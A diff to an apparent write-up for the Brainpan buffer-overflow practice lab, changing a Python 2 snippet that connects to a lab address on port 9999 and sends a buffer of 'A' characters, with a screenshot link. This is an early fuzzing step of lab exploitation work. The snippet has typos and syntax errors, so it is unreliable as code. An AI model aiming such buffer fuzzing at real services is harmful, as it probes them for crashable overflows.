@@ -77,9 +77,11 @@ IP ID Sequence Generation: All zeros
 import socket
 
 for i in range(30):
-s.connect = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) 
+s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+s.connect(("192.168.56.105",9999)
 payloaod = ("A"*100)
 s.send(payload+"\r\n")
 print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
 s.close
 ```
+!()[https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/sending-A's.png]
